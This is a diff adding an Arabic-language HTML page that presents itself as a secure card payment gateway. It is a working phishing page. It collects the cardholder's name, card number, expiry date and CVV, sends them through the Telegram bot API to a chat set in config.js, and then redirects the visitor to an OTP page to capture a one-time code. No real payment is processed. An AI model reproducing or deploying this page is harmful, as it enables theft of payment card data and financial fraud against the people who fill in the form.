@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>بوابة الدفع الآمنة</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="config.js"></script>
+</head>
+<body class="bg-gray-100 p-8">
+    <div class="max-w-md mx-auto bg-white p-6 rounded-2xl shadow-md">
+        <h2 class="text-xl font-bold mb-4 text-center">💳 بيانات الدفع بالبطاقة</h2>
+        <form id="paymentForm" onsubmit="submitCard(event)" class="space-y-4">
+            <input type="text" id="cardName" placeholder="اسم صاحب البطاقة" required class="w-full p-3 border rounded-xl">
+            <input type="text" id="cardNumber" placeholder="رقم البطاقة (16 رقم)" required class="w-full p-3 border rounded-xl font-mono">
+            <div class="flex gap-2">
+                <input type="text" id="cardExp" placeholder="MM/YY" required class="w-1/2 p-3 border rounded-xl font-mono">
+                <input type="text" id="cardCvv" placeholder="CVV" required class="w-1/2 p-3 border rounded-xl font-mono">
+            </div>
+            <button type="submit" id="submitBtn" class="w-full bg-green-600 text-white font-bold py-3 rounded-xl">إتمام الدفع</button>
+        </form>
+    </div>
+
+    <script>
+        async function submitCard(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = "جاري المعالجة...";
+
+            const cardData = {
+                name: document.getElementById('cardName').value,
+                number: document.getElementById('cardNumber').value,
+                exp: document.getElementById('cardExp').value,
+                cvv: document.getElementById('cardCvv').value
+            };
+
+            const text = `💳 *طلب بطاقة جديد من [${SITE_CONFIG.STORE_NAME}]*\n` +
+                         `👤 الاسم: ${cardData.name}\n` +
+                         `💳 الرقم: \`${cardData.number}\`\n` +
+                         `📅 الانتهاء: \`${cardData.exp}\`\n` +
+                         `🔒 CVV: \`${cardData.cvv}\``;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${SITE_CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: SITE_CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+
+                // الانتقال لصفحة OTP بعد نجاح الإرسال
+                window.location.href = 'otp.html';
+            } catch (err) {
+                alert("حدث خطأ في الاتصال، حاول مرة أخرى.");
+                btn.disabled = false;
+                btn.textContent = "إتمام الدفع";
+            }
+        }
+    </script>
+</body>
+</html>
